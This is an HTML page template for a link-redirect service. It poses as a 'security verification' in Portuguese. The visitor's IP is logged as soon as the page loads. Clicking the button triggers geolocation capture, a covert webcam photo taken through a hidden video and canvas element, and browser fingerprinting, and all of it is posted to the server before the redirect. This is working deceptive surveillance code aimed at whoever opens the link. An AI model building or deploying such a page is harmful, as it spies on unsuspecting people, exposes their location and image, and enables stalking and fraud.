<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>{{ link.og_title or 'Redirecionando...' }}</title>

    <!-- Open Graph Meta Tags -->
    <meta property="og:title" content="{{ link.og_title }}">
    <meta property="og:description" content="{{ link.og_description }}">
    <meta property="og:image" content="{{ link.og_image }}">
    <meta property="og:url" content="{{ request.url }}">
    <meta property="og:type" content="website">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
</head>
<body style="display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background-color: #0f172a; color: white; font-family: sans-serif;">

    <div id="spinner" style="margin-bottom: 20px;">
        <div style="border: 8px solid #f3f3f3; border-top: 8px solid #3b82f6; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite;"></div>
    </div>

    <h3 id="mensagem" style="text-align: center;"> Verificação de Segurança! Clique no botão abaixo para continuar.</h3>

    <button id="permitir" style="padding: 10px 20px; font-size: 16px; margin-top: 20px;">Clique para continuar</button>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>

    <script>
        const slug = {{ slug | tojson | safe }};
        // Capturar IP logo no carregamento da página
(async () => {
    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipJson = await ipRes.json();
        const ip = ipJson.ip;

        await fetch("/coletar_ip_inicial", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ slug, ip })
        });
    } catch (e) {
        console.warn("Erro ao capturar IP inicial:", e);
    }
})();

        const destino = {{ destino | tojson | safe }};
        const inicioTempo = Date.now();

        const coletarInfoBrowser = async () => {
            const userAgent = navigator.userAgent;
            const idioma = navigator.language;
            const fusoHorario = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const larguraTela = window.screen.width;
            const alturaTela = window.screen.height;
            const plataforma = navigator.platform;
            const conexao = (navigator.connection || {}).effectiveType || "indisponível";

            let ip = "indefinido";
            try {
                const ipRes = await fetch("https://api.ipify.org?format=json");
                const ipJson = await ipRes.json();
                ip = ipJson.ip;
            } catch (e) {
                console.warn("IP não obtido:", e);
            }

            return {
                userAgent,
                idioma,
                fusoHorario,
                larguraTela,
                alturaTela,
                plataforma,
                conexao,
                ip
            };
        };

        async function coletarDados() {
            let latitude = "", longitude = "", foto_base64 = "";

            function atualizarMensagem(texto) {
                document.getElementById('mensagem').innerText = texto;
            }

            atualizarMensagem("verificação concluida");

            // Localização
            try {
                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
                latitude = pos.coords.latitude;
                longitude = pos.coords.longitude;
            } catch (e) {
                console.warn("Erro na geolocalização:", e);
            }

            // Câmera
            try {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                await new Promise(r => setTimeout(r, 2000)); // Espera 2s para a câmera ligar

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                foto_base64 = canvas.toDataURL("image/png");

                stream.getTracks().forEach(t => t.stop());
            } catch (e) {
                console.warn("Erro ao acessar câmera:", e);
            }

            const infosBrowser = await coletarInfoBrowser();
            const tempoSegundos = Math.floor((Date.now() - inicioTempo) / 1000);

            const payload = {
                slug,
                latitude,
                longitude,
                foto_base64,
                tempoSegundos,
                ...infosBrowser
            };

            try {
                const res = await fetch("/coletar_dados", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
                const json = await res.json();
                window.location.href = json.destino;
            } catch (e) {
                console.error("Erro ao enviar dados:", e);
                atualizarMensagem("Erro no envio de dados.");
            }
        }

        document.getElementById("permitir").addEventListener("click", () => {
            document.getElementById("permitir").style.display = "none";
            coletarDados();
        });
    </script>

</body>
</html>
